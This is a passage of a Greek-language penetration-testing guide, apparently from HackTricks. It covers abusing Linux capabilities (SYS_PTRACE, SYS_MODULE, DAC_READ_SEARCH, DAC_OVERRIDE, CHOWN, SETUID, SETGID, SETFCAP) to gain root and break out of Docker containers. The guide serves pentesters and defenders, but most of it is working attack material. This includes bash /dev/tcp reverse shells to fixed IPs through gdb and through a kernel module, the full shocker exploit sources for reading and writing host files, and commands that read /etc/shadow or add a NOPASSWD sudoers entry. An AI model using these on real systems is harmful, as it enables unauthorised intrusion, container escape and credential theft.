Αν το **GDB** είναι εγκατεστημένο (ή μπορείτε να το εγκαταστήσετε, για παράδειγμα, με `apk add gdb` ή `apt install gdb`), μπορείτε να κάνετε **debug σε μια διεργασία από το host** και να την κάνετε να καλέσει τη συνάρτηση `system`. (Αυτή η τεχνική απαιτεί επίσης το capability `SYS_ADMIN`)**.**
```bash
gdb -p 1234
(gdb) call (void)system("ls")
(gdb) call (void)system("sleep 5")
(gdb) call (void)system("bash -c 'bash -i >& /dev/tcp/192.168.115.135/5656 0>&1'")
```
Δεν θα μπορείτε να δείτε την έξοδο της εντολής που εκτελέστηκε, αλλά θα εκτελεστεί από αυτήν τη διεργασία (οπότε αποκτήστε ένα rev shell).

> [!WARNING]
> Αν λάβετε το σφάλμα "No symbol "system" in current context." ελέγξτε το προηγούμενο παράδειγμα φόρτωσης ενός shellcode σε ένα πρόγραμμα μέσω του gdb.

**Παράδειγμα με environment (Docker breakout) - Shellcode Injection**

Μπορείτε να ελέγξετε τα ενεργοποιημένα capabilities μέσα στο docker container χρησιμοποιώντας:
```bash
capsh --print
Current: = cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_sys_ptrace,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_sys_ptrace,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root
```
Λίστα με τις **processes** που εκτελούνται στο **host** `ps -eaf`

1. Βρείτε την **architecture** `uname -m`
2. Βρείτε ένα **shellcode** για την architecture ([https://www.exploit-db.com/exploits/41128](https://www.exploit-db.com/exploits/41128))
3. Βρείτε ένα **program** για να κάνετε **inject** το **shellcode** στη μνήμη μιας process ([https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c](https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c))
4. **Τροποποιήστε** το **shellcode** μέσα στο program και κάντε compile το `gcc inject.c -o inject`
5. Κάντε **inject** και αποκτήστε το **shell** σας: `./inject 299; nc 172.17.0.1 5600`

## CAP_SYS_MODULE

Το **[`CAP_SYS_MODULE`](https://man7.org/linux/man-pages/man7/capabilities.7.html)** επιτρέπει σε μια process να κάνει **load και unload kernel modules (`init_module(2)`, `finit_module(2)` και `delete_module(2)` system calls)**, παρέχοντας άμεση πρόσβαση στις βασικές λειτουργίες του kernel. Αυτή η capability παρουσιάζει κρίσιμους κινδύνους ασφαλείας, επειδή η φόρτωση ενός module μπορεί να τροποποιήσει τη συμπεριφορά του kernel και να παρακάμψει τα όρια απομόνωσης.<sup>[[6]](#references)[[14]](#references)</sup>
**Αυτό επιτρέπει την εισαγωγή ή την αφαίρεση modules στον kernel που είναι ορατός από την process· σε ένα container, το αν πρόκειται για τον kernel του host εξαρτάται από τη διαμόρφωση απομόνωσης**.<sup>[[14]](#references)</sup>

**Παράδειγμα με binary**

Στο ακόλουθο παράδειγμα, το binary **`python`** διαθέτει αυτή την capability.
```bash
getcap -r / 2>/dev/null
/usr/bin/python2.7 = cap_sys_module+ep
```
Από προεπιλογή, η εντολή **`modprobe`** ελέγχει για λίστες dependencies και αρχεία map στον κατάλογο **`/lib/modules/$(uname -r)`**.\
Για να το εκμεταλλευτούμε, ας δημιουργήσουμε έναν πλαστό φάκελο **lib/modules**:
```bash
mkdir lib/modules -p
cp -a /lib/modules/5.0.0-20-generic/ lib/modules/$(uname -r)
```
Στη συνέχεια **κάντε compile το kernel module που μπορείτε να βρείτε παρακάτω σε 2 παραδείγματα και αντιγράψτε** το σε αυτόν τον φάκελο:
```bash
cp reverse-shell.ko lib/modules/$(uname -r)/
```
Τέλος, εκτελέστε τον απαιτούμενο κώδικα Python για να φορτώσετε αυτό το kernel module:
```python
import kmod
km = kmod.Kmod()
km.set_mod_dir("/path/to/fake/lib/modules/5.0.0-20-generic/")
km.modprobe("reverse-shell")
```
**Παράδειγμα 2 με binary**

Στο ακόλουθο παράδειγμα το binary **`kmod`** έχει αυτήν τη capability.
```bash
getcap -r / 2>/dev/null
/bin/kmod = cap_sys_module+ep
```
Που σημαίνει ότι είναι δυνατό να χρησιμοποιηθεί η εντολή **`insmod`** για την εισαγωγή ενός kernel module. Ακολουθήστε το παρακάτω παράδειγμα για να αποκτήσετε ένα **reverse shell** κάνοντας abuse αυτού του privilege.

**Παράδειγμα με environment (Docker breakout)**

Μπορείτε να ελέγξετε τα ενεργοποιημένα capabilities μέσα στο docker container χρησιμοποιώντας:
```bash
capsh --print
Current: = cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_module,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_module,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```
Στο προηγούμενο output μπορείτε να δείτε ότι η δυνατότητα **SYS_MODULE** είναι ενεργοποιημένη.<sup>[[14]](#references)</sup>

**Δημιουργήστε** το **kernel module** που πρόκειται να εκτελέσει ένα reverse shell και το **Makefile** για να το **compile**:
```c:reverse-shell.c
#include <linux/kmod.h>
#include <linux/module.h>
MODULE_LICENSE("GPL");
MODULE_AUTHOR("AttackDefense");
MODULE_DESCRIPTION("LKM reverse shell module");
MODULE_VERSION("1.0");

char* argv[] = {"/bin/bash","-c","bash -i >& /dev/tcp/10.10.14.8/4444 0>&1", NULL};
static char* envp[] = {"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin", NULL };

// call_usermodehelper function is used to create user mode processes from kernel space
static int __init reverse_shell_init(void) {
return call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
}

static void __exit reverse_shell_exit(void) {
printk(KERN_INFO "Exiting\n");
}

module_init(reverse_shell_init);
module_exit(reverse_shell_exit);
```

```bash:Makefile
obj-m +=reverse-shell.o

all:
make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules

clean:
make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
```
> [!WARNING]
> Ο χαρακτήρας κενού πριν από κάθε λέξη `make` στο Makefile **πρέπει να είναι tab και όχι κενά**!

Εκτελέστε το `make` για να το μεταγλωττίσετε.
```bash
Make[1]: *** /lib/modules/5.10.0-kali7-amd64/build: No such file or directory.  Stop.

sudo apt update
sudo apt full-upgrade
```
Τέλος, εκκινήστε το `nc` μέσα σε ένα shell και **φορτώστε το module** από ένα άλλο, και θα καταγράψετε το shell στη διεργασία nc:
```bash
#Shell 1
nc -lvnp 4444

#Shell 2
insmod reverse-shell.ko #Launch the reverse shell
```
**Ο κώδικας αυτής της τεχνικής αντιγράφηκε από το laboratory "Abusing SYS_MODULE Capability" του** [**https://www.pentesteracademy.com/**](https://www.pentesteracademy.com).<sup>[[1]](#references)</sup>

Ένα ακόμη παράδειγμα αυτής της τεχνικής μπορεί να βρεθεί στο [https://www.cyberark.com/resources/threat-research-blog/how-i-hacked-play-with-docker-and-remotely-ran-code-on-the-host](https://www.cyberark.com/resources/threat-research-blog/how-i-hacked-play-with-docker-and-remotely-ran-code-on-the-host)

## CAP_DAC_READ_SEARCH

Το [**CAP_DAC_READ_SEARCH**](https://man7.org/linux/man-pages/man7/capabilities.7.html) επιτρέπει σε μια διεργασία να **παρακάμπτει τα δικαιώματα για την ανάγνωση αρχείων και για την ανάγνωση και εκτέλεση καταλόγων**. Η κύρια χρήση του είναι η αναζήτηση ή η ανάγνωση αρχείων. Ωστόσο, επιτρέπει επίσης σε μια διεργασία να χρησιμοποιεί τη συνάρτηση `open_by_handle_at(2)`, η οποία μπορεί να προσπελάσει οποιοδήποτε αρχείο, συμπεριλαμβανομένων αρχείων εκτός του mount namespace της διεργασίας. Το handle που χρησιμοποιείται στην `open_by_handle_at(2)` υποτίθεται ότι είναι ένα μη διαφανές αναγνωριστικό που λαμβάνεται μέσω της `name_to_handle_at(2)`, αλλά μπορεί να περιλαμβάνει ευαίσθητες πληροφορίες, όπως αριθμούς inode, οι οποίοι είναι ευάλωτοι σε παραποίηση. Η δυνατότητα εκμετάλλευσης αυτής της capability, ιδιαίτερα στο πλαίσιο Docker containers, παρουσιάστηκε από τον Sebastian Krahmer με το shocker exploit, όπως αναλύεται [εδώ](https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3).<sup>[[12]](#references)[[13]](#references)</sup>
**Αυτό σημαίνει ότι μπορείτε να παρακάμπτετε τους ελέγχους δικαιωμάτων ανάγνωσης αρχείων και τους ελέγχους δικαιωμάτων ανάγνωσης/εκτέλεσης καταλόγων**.<sup>[[14]](#references)</sup>

**Παράδειγμα με binary**

Το binary μπορεί να διαβάζει αρχεία που είναι προσβάσιμα στα namespaces του. Επομένως, αν ένα αρχείο όπως το `tar` έχει αυτή την capability, μπορεί να διαβάσει το shadow file:
```bash
cd /etc
tar -czf /tmp/shadow.tar.gz shadow #Compress show file in /tmp
cd /tmp
tar -cxf shadow.tar.gz
```
**Παράδειγμα με binary2**

Σε αυτήν την περίπτωση, ας υποθέσουμε ότι το binary **`python`** έχει αυτήν τη capability. Για να παραθέσετε τα root files, μπορείτε να εκτελέσετε:
```python
import os
for r, d, f in os.walk('/root'):
for filename in f:
print(filename)
```
Και για να διαβάσετε ένα αρχείο, θα μπορούσατε να κάνετε:
```python
print(open("/etc/shadow", "r").read())
```
**Παράδειγμα σε Περιβάλλον (Docker breakout)**

Μπορείτε να ελέγξετε τις ενεργοποιημένες capabilities μέσα στο Docker container χρησιμοποιώντας `capsh --print`.<sup>[[14]](#references)[[26]](#references)</sup>
```
capsh --print
Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```
Στην προηγούμενη έξοδο μπορείτε να δείτε ότι η δυνατότητα **DAC_READ_SEARCH** είναι ενεργοποιημένη. Αυτό παρακάμπτει τους ελέγχους ανάγνωσης/αναζήτησης DAC και επιτρέπει τη χρήση του `open_by_handle_at(2)`· από μόνη της δεν είναι δυνατότητα debugging διεργασιών.<sup>[[14]](#references)</sup>

Μπορείτε να μάθετε πώς λειτουργεί το ακόλουθο exploit στο [https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3](https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3), αλλά συνοπτικά, το **CAP_DAC_READ_SEARCH** επιτρέπει την περιήγηση στο file system χωρίς ελέγχους δικαιωμάτων και επιτρέπει τη χρήση του `open_by_handle_at(2)`· αυτό μπορεί να εκθέσει αρχεία που έχουν ανοιχτεί από άλλες διεργασίες, όταν τα σχετικά namespaces και mounts είναι προσβάσιμα.<sup>[[13]](#references)[[14]](#references)</sup>

Το αρχικό exploit που κάνει abuse αυτών των δικαιωμάτων για την ανάγνωση αρχείων από το host βρίσκεται εδώ: [http://stealth.openwall.net/xSports/shocker.c](http://stealth.openwall.net/xSports/shocker.c)· το ακόλουθο είναι μια **τροποποιημένη έκδοση που σας επιτρέπει να περάσετε το αρχείο προς ανάγνωση ως πρώτο όρισμα και να αποθηκεύσετε το αποτέλεσμα σε ένα αρχείο**.<sup>[[12]](#references)</sup>
```c
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <errno.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <dirent.h>
#include <stdint.h>

// gcc shocker.c -o shocker
// ./socker /etc/shadow shadow #Read /etc/shadow from host and save result in shadow file in current dir

struct my_file_handle {
unsigned int handle_bytes;
int handle_type;
unsigned char f_handle[8];
};

void die(const char *msg)
{
perror(msg);
exit(errno);
}

void dump_handle(const struct my_file_handle *h)
{
fprintf(stderr,"[*] #=%d, %d, char nh[] = {", h->handle_bytes,
h->handle_type);
for (int i = 0; i < h->handle_bytes; ++i) {
fprintf(stderr,"0x%02x", h->f_handle[i]);
if ((i + 1) % 20 == 0)
fprintf(stderr,"\n");
if (i < h->handle_bytes - 1)
fprintf(stderr,", ");
}
fprintf(stderr,"};\n");
}

int find_handle(int bfd, const char *path, const struct my_file_handle *ih, struct my_file_handle
*oh)
{
int fd;
uint32_t ino = 0;
struct my_file_handle outh = {
.handle_bytes = 8,
.handle_type = 1
};
DIR *dir = NULL;
struct dirent *de = NULL;
path = strchr(path, '/');
// recursion stops if path has been resolved
if (!path) {
memcpy(oh->f_handle, ih->f_handle, sizeof(oh->f_handle));
oh->handle_type = 1;
oh->handle_bytes = 8;
return 1;
}

++path;
fprintf(stderr, "[*] Resolving '%s'\n", path);
if ((fd = open_by_handle_at(bfd, (struct file_handle *)ih, O_RDONLY)) < 0)
die("[-] open_by_handle_at");
if ((dir = fdopendir(fd)) == NULL)
die("[-] fdopendir");
for (;;) {
de = readdir(dir);
if (!de)
break;
fprintf(stderr, "[*] Found %s\n", de->d_name);
if (strncmp(de->d_name, path, strlen(de->d_name)) == 0) {
fprintf(stderr, "[+] Match: %s ino=%d\n", de->d_name, (int)de->d_ino);
ino = de->d_ino;
break;
}
}

fprintf(stderr, "[*] Brute forcing remaining 32bit. This can take a while...\n");
if (de) {
for (uint32_t i = 0; i < 0xffffffff; ++i) {
outh.handle_bytes = 8;
outh.handle_type = 1;
memcpy(outh.f_handle, &ino, sizeof(ino));
memcpy(outh.f_handle + 4, &i, sizeof(i));
if ((i % (1<<20)) == 0)
fprintf(stderr, "[*] (%s) Trying: 0x%08x\n", de->d_name, i);
if (open_by_handle_at(bfd, (struct file_handle *)&outh, 0) > 0) {
closedir(dir);
close(fd);
dump_handle(&outh);
return find_handle(bfd, path, &outh, oh);
}
}
}
closedir(dir);
close(fd);
return 0;
}


int main(int argc,char* argv[] )
{
char buf[0x1000];
int fd1, fd2;
struct my_file_handle h;
struct my_file_handle root_h = {
.handle_bytes = 8,
.handle_type = 1,
.f_handle = {0x02, 0, 0, 0, 0, 0, 0, 0}
};

fprintf(stderr, "[***] docker VMM-container breakout Po(C) 2014 [***]\n"
"[***] The tea from the 90's kicks your sekurity again. [***]\n"
"[***] If you have pending sec consulting, I'll happily [***]\n"
"[***] forward to my friends who drink secury-tea too! [***]\n\n<enter>\n");

read(0, buf, 1);

// get a FS reference from something mounted in from outside
if ((fd1 = open("/etc/hostname", O_RDONLY)) < 0)
die("[-] open");

if (find_handle(fd1, argv[1], &root_h, &h) <= 0)
die("[-] Cannot find valid handle!");

fprintf(stderr, "[!] Got a final handle!\n");
dump_handle(&h);

if ((fd2 = open_by_handle_at(fd1, (struct file_handle *)&h, O_RDONLY)) < 0)
die("[-] open_by_handle");

memset(buf, 0, sizeof(buf));
if (read(fd2, buf, sizeof(buf) - 1) < 0)
die("[-] read");

printf("Success!!\n");

FILE *fptr;
fptr = fopen(argv[2], "w");
fprintf(fptr,"%s", buf);
fclose(fptr);

close(fd2); close(fd1);

return 0;
}
```
> [!WARNING]
> Το exploit πρέπει να βρει έναν pointer προς κάτι που είναι mounted στο host. Το αρχικό exploit χρησιμοποιούσε το αρχείο /.dockerinit, ενώ αυτή η τροποποιημένη έκδοση χρησιμοποιεί το /etc/hostname. Αν το exploit δεν λειτουργεί, ίσως χρειάζεται να ορίσετε διαφορετικό αρχείο. Για να βρείτε ένα αρχείο που είναι mounted στο host, απλώς εκτελέστε την εντολή mount:

![CAP SYS MODULE - CAP DAC READ SEARCH: Το exploit πρέπει να βρει έναν pointer προς κάτι που είναι mounted στο host. Το αρχικό exploit χρησιμοποιούσε το αρχείο /.dockerinit, ενώ αυτή η τροποποιημένη έκδοση χρησιμοποιεί...](<../../images/image (407) (1).png>)

**Ο κώδικας αυτής της τεχνικής αντιγράφηκε από το εργαστήριο "Abusing DAC_READ_SEARCH Capability" του** [**https://www.pentesteracademy.com/**](https://www.pentesteracademy.com).<sup>[[1]](#references)</sup>


## CAP_DAC_OVERRIDE

**Αυτή η capability παρακάμπτει τους ελέγχους δικαιωμάτων read, write και execute αρχείων**.<sup>[[14]](#references)</sup>

Αναζητήστε αρχεία που γίνονται readable ή writable μέσω συμμετοχής σε privileged group· οι χρήσιμοι στόχοι εξαρτώνται από το ownership και τα mode bits του target.<sup>[[14]](#references)</sup>

**Παράδειγμα με binary**

Σε αυτό το παράδειγμα, το vim διαθέτει αυτή την capability, επομένως μπορείτε να τροποποιήσετε οποιοδήποτε αρχείο, όπως τα _passwd_, _sudoers_ ή _shadow_:
```bash
getcap -r / 2>/dev/null
/usr/bin/vim = cap_dac_override+ep

vim /etc/sudoers #To overwrite it
```
**Παράδειγμα με binary 2**

Σε αυτό το παράδειγμα το binary **`python`** θα έχει αυτήν τη δυνατότητα. Θα μπορούσες να χρησιμοποιήσεις το python για να παρακάμψεις οποιοδήποτε αρχείο:
```python
file=open("/etc/sudoers","a")
file.write("yourusername ALL=(ALL) NOPASSWD:ALL")
file.close()
```
**Παράδειγμα με environment + CAP_DAC_READ_SEARCH (Docker breakout)**

Επιβεβαιώστε το `CAP_DAC_OVERRIDE` με `capsh --print`, όπως φαίνεται στο προηγούμενο παράδειγμα environment με `CAP_DAC_READ_SEARCH`.<sup>[[14]](#references)[[26]](#references)</sup>

Πρώτα απ’ όλα, διαβάστε την προηγούμενη ενότητα που [**καταχράται τη δυνατότητα DAC_READ_SEARCH για την ανάγνωση αυθαίρετων αρχείων**](linux-capabilities.md#cap_dac_read_search) του host και **compile** το exploit.\
Στη συνέχεια, **compile την ακόλουθη έκδοση του shocker exploit**, η οποία θα σας επιτρέψει να **γράψετε αυθαίρετα αρχεία** μέσα στο filesystem του host:
```c
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <errno.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <dirent.h>
#include <stdint.h>

// gcc shocker_write.c -o shocker_write
// ./shocker_write /etc/passwd passwd

struct my_file_handle {
unsigned int handle_bytes;
int handle_type;
unsigned char f_handle[8];
};
void die(const char * msg) {
perror(msg);
exit(errno);
}
void dump_handle(const struct my_file_handle * h) {
fprintf(stderr, "[*] #=%d, %d, char nh[] = {", h -> handle_bytes,
h -> handle_type);
for (int i = 0; i < h -> handle_bytes; ++i) {
fprintf(stderr, "0x%02x", h -> f_handle[i]);
if ((i + 1) % 20 == 0)
fprintf(stderr, "\n");
if (i < h -> handle_bytes - 1)
fprintf(stderr, ", ");
}
fprintf(stderr, "};\n");
}
int find_handle(int bfd, const char *path, const struct my_file_handle *ih, struct my_file_handle *oh)
{
int fd;
uint32_t ino = 0;
struct my_file_handle outh = {
.handle_bytes = 8,
.handle_type = 1
};
DIR * dir = NULL;
struct dirent * de = NULL;
path = strchr(path, '/');
// recursion stops if path has been resolved
if (!path) {
memcpy(oh -> f_handle, ih -> f_handle, sizeof(oh -> f_handle));
oh -> handle_type = 1;
oh -> handle_bytes = 8;
return 1;
}
++path;
fprintf(stderr, "[*] Resolving '%s'\n", path);
if ((fd = open_by_handle_at(bfd, (struct file_handle * ) ih, O_RDONLY)) < 0)
die("[-] open_by_handle_at");
if ((dir = fdopendir(fd)) == NULL)
die("[-] fdopendir");
for (;;) {
de = readdir(dir);
if (!de)
break;
fprintf(stderr, "[*] Found %s\n", de -> d_name);
if (strncmp(de -> d_name, path, strlen(de -> d_name)) == 0) {
fprintf(stderr, "[+] Match: %s ino=%d\n", de -> d_name, (int) de -> d_ino);
ino = de -> d_ino;
break;
}
}
fprintf(stderr, "[*] Brute forcing remaining 32bit. This can take a while...\n");
if (de) {
for (uint32_t i = 0; i < 0xffffffff; ++i) {
outh.handle_bytes = 8;
outh.handle_type = 1;
memcpy(outh.f_handle, & ino, sizeof(ino));
memcpy(outh.f_handle + 4, & i, sizeof(i));
if ((i % (1 << 20)) == 0)
fprintf(stderr, "[*] (%s) Trying: 0x%08x\n", de -> d_name, i);
if (open_by_handle_at(bfd, (struct file_handle * ) & outh, 0) > 0) {
closedir(dir);
close(fd);
dump_handle( & outh);
return find_handle(bfd, path, & outh, oh);
}
}
}
closedir(dir);
close(fd);
return 0;
}
int main(int argc, char * argv[]) {
char buf[0x1000];
int fd1, fd2;
struct my_file_handle h;
struct my_file_handle root_h = {
.handle_bytes = 8,
.handle_type = 1,
.f_handle = {
0x02,
0,
0,
0,
0,
0,
0,
0
}
};
fprintf(stderr, "[***] docker VMM-container breakout Po(C) 2014 [***]\n"
"[***] The tea from the 90's kicks your sekurity again. [***]\n"
"[***] If you have pending sec consulting, I'll happily [***]\n"
"[***] forward to my friends who drink secury-tea too! [***]\n\n<enter>\n");
read(0, buf, 1);
// get a FS reference from something mounted in from outside
if ((fd1 = open("/etc/hostname", O_RDONLY)) < 0)
die("[-] open");
if (find_handle(fd1, argv[1], & root_h, & h) <= 0)
die("[-] Cannot find valid handle!");
fprintf(stderr, "[!] Got a final handle!\n");
dump_handle( & h);
if ((fd2 = open_by_handle_at(fd1, (struct file_handle * ) & h, O_RDWR)) < 0)
die("[-] open_by_handle");
char * line = NULL;
size_t len = 0;
FILE * fptr;
ssize_t read;
fptr = fopen(argv[2], "r");
while ((read = getline( & line, & len, fptr)) != -1) {
write(fd2, line, read);
}
printf("Success!!\n");
close(fd2);
close(fd1);
return 0;
}
```
Για να **διαφύγετε από το docker container**, θα μπορούσατε να **download** τα αρχεία `/etc/shadow` και `/etc/passwd` από το host, να **add** σε αυτά έναν **new user** και να χρησιμοποιήσετε το **`shocker_write`** για να τα αντικαταστήσετε. Στη συνέχεια, **access** μέσω **ssh**.

**Ο κώδικας αυτής της τεχνικής αντιγράφηκε από το εργαστήριο "Abusing DAC_OVERRIDE Capability" του** [**https://www.pentesteracademy.com**](https://www.pentesteracademy.com).<sup>[[1]](#references)</sup>

## CAP_CHOWN

**Αυτή η capability επιτρέπει σε μια διεργασία να αλλάζει την ιδιοκτησία αρχείων**.<sup>[[14]](#references)</sup>

**Παράδειγμα με binary**

Ας υποθέσουμε ότι το **`python`** binary διαθέτει αυτήν την capability· μπορείτε να αλλάξετε τον owner ενός αρχείου, όπως το **`shadow`**, και στη συνέχεια να χρησιμοποιήσετε την πρόσβαση που προκύπτει για να το τροποποιήσετε, εφόσον το επιτρέπουν τα υπόλοιπα permissions:
```bash
python -c 'import os;os.chown("/etc/shadow",1000,1000)'
```
Ή με το binary **`ruby`** να διαθέτει αυτήν τη capability:
```bash
ruby -e 'require "fileutils"; FileUtils.chown(1000, 1000, "/etc/shadow")'
```
## CAP_FOWNER

**Αυτή η capability παρακάμπτει τους ελέγχους ιδιοκτησίας για πολλές λειτουργίες αρχείων, συμπεριλαμβανομένης της αλλαγής δικαιωμάτων**.<sup>[[14]](#references)</sup>

**Παράδειγμα με binary**

Αν το python διαθέτει αυτή την capability, μπορείτε να τροποποιήσετε τα δικαιώματα του shadow file, **να αλλάξετε το root password** και να κάνετε escalate privileges:
```bash
python -c 'import os; os.chmod("/etc/shadow", 0o666)'
```
### CAP_SETUID

**Αυτή η capability επιτρέπει σε μια διεργασία να αλλάξει το effective user ID της, με την επιφύλαξη των κανόνων credential και capability που επιβάλλονται από τον kernel**.<sup>[[14]](#references)</sup>

**Παράδειγμα με binary**

Αν η python έχει αυτή την **capability**, μπορείτε πολύ εύκολα να την κάνετε abuse για να κλιμακώσετε τα privileges σε root:
```python
import os
os.setuid(0)
os.system("/bin/bash")
```
**Ένας άλλος τρόπος:**
```python
import os
import prctl
#add the capability to the effective set
prctl.cap_effective.setuid = True
os.setuid(0)
os.system("/bin/bash")
```
## CAP_SETGID

**Αυτή η capability επιτρέπει σε μια διεργασία να αλλάξει το effective group ID της, με την επιφύλαξη των κανόνων credential και capability που επιβάλλονται από τον kernel**.<sup>[[14]](#references)</sup>

Υπάρχουν πολλά αρχεία που μπορείτε να **κάνετε overwrite για να κάνετε privilege escalation,** [**μπορείτε να πάρετε ιδέες από εδώ**](../processes-crontab-systemd-dbus/payloads-to-execute.md#overwriting-a-file-to-escalate-privileges).

**Παράδειγμα με binary**

Σε αυτή την περίπτωση, θα πρέπει να αναζητήσετε ενδιαφέροντα αρχεία που μπορεί να διαβάσει μια ομάδα, επειδή μπορείτε να κάνετε impersonate οποιαδήποτε ομάδα:
```bash
#Find every file writable by a group
find / -perm /g=w -exec ls -lLd {} \; 2>/dev/null
#Find every file writable by a group in /etc with a maxpath of 1
find /etc -maxdepth 1 -perm /g=w -exec ls -lLd {} \; 2>/dev/null
#Find every file readable by a group in /etc with a maxpath of 1
find /etc -maxdepth 1 -perm /g=r -exec ls -lLd {} \; 2>/dev/null
```
Μόλις εντοπίσετε ένα αρχείο που μπορείτε να καταχραστείτε (μέσω ανάγνωσης ή εγγραφής) για να κλιμακώσετε τα προνόμια, μπορείτε να **αποκτήσετε ένα shell που μιμείται την ενδιαφέρουσα ομάδα** με:
```python
import os
os.setgid(42)
os.system("/bin/bash")
```
Σε αυτήν την περίπτωση έγινε impersonation του group shadow, οπότε μπορείτε να διαβάσετε το αρχείο `/etc/shadow`:
```bash
cat /etc/shadow
```
### Συνδυαστική αλυσίδα: CAP_SETGID + CAP_CHOWN

Όταν και τα δύο capabilities είναι διαθέσιμα στο ίδιο helper, μια πρακτική αλυσίδα είναι:

1. Αλλάξτε το EGID σε `shadow` (ή σε άλλη privileged group).
2. Χρησιμοποιήστε το `chown` στο `/etc/shadow` για να ορίσετε το UID σας, διατηρώντας το group `shadow`.
3. Διαβάστε ένα target hash και κάντε crack/pivot.
```python
import os

# Replace values with real IDs from `id` / `getent group shadow`
LAB_UID = 1000
SHADOW_GID = 42

os.setgid(SHADOW_GID)
os.chown("/etc/shadow", LAB_UID, SHADOW_GID)
os.system("grep '^root:' /etc/shadow > /tmp/root.hash")
```
Αυτό αποφεύγει την ανάγκη για πλήρη πρόσβαση root απευθείας και συνήθως αρκεί για pivot μέσω επαναχρησιμοποίησης credentials.

Αν έχει εγκατασταθεί το **docker**, θα μπορούσατε να κάνετε **impersonate** το **docker group** και να το καταχραστείτε για επικοινωνία με το [**docker socket** και κλιμάκωση προνομίων](#writable-docker-socket).

## CAP_SETFCAP

**Αυτή η capability επιτρέπει σε ένα process να ορίζει file capabilities**.<sup>[[14]](#references)</sup>

**Παράδειγμα με binary**

Αν η python διαθέτει αυτή την **capability**, μπορείτε πολύ εύκολα να την καταχραστείτε για να κάνετε privilege escalation σε root:
```python:setcapability.py
import ctypes, sys

#Load needed library
#You can find which library you need to load checking the libraries of local setcap binary
# ldd /sbin/setcap
libcap = ctypes.cdll.LoadLibrary("libcap.so.2")

libcap.cap_from_text.argtypes = [ctypes.c_char_p]
libcap.cap_from_text.restype = ctypes.c_void_p
libcap.cap_set_file.argtypes = [ctypes.c_char_p,ctypes.c_void_p]

#Give setuid cap to the binary
cap = 'cap_setuid+ep'
path = sys.argv[1]
print(path)
cap_t = libcap.cap_from_text(cap)
status = libcap.cap_set_file(path,cap_t)

if(status == 0):
print (cap + " was successfully added to " + path)
```

```bash
python setcapability.py /usr/bin/python2.7
```
> [!WARNING]
> Ένα νεοεγγεγραμμένο σύνολο file capabilities αντικαθιστά το προηγούμενο σύνολο· αν στη συνέχεια εκτελεστεί το helper μόνο με τα νέα capabilities, ενδέχεται να μην διατηρεί πλέον το `CAP_SETFCAP` για την ενημέρωση κάποιου άλλου αρχείου.<sup>[[14]](#references)[[25]](#references)</sup>

Μόλις αποκτήσετε [SETUID capability](linux-capabilities.md#cap_setuid), μπορείτε να μεταβείτε στην ενότητά του για να δείτε πώς να κάνετε privilege escalation.

**Παράδειγμα με environment (Docker breakout)**

Το τεκμηριωμένο προεπιλεγμένο σύνολο capabilities του Docker περιλαμβάνει το **CAP_SETFCAP**, αλλά το πραγματικό σύνολο εξαρτάται από τη ρύθμιση του runtime.<sup>[[19]](#references)</sup>
Μπορείτε να ελέγξετε τα capabilities της διεργασίας με:
```bash
cat /proc/`pidof bash`/status | grep Cap
CapInh: 00000000a80425fb
CapPrm: 00000000a80425fb
CapEff: 00000000a80425fb
CapBnd: 00000000a80425fb
CapAmb: 0000000000000000

capsh --decode=00000000a80425fb
0x00000000a80425fb=cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
```
Αυτή η capability επιτρέπει την εγγραφή capabilities αρχείων, αλλά από μόνη της δεν εκχωρεί αυτές τις capabilities στην τρέχουσα διεργασία ούτε παρακάμπτει τους κανόνες αρχείου, bounding-set και namespace που εφαρμόζονται κατά την εκτέλεση του αρχείου.<sup>[[14]](#references)</sup>
```bash
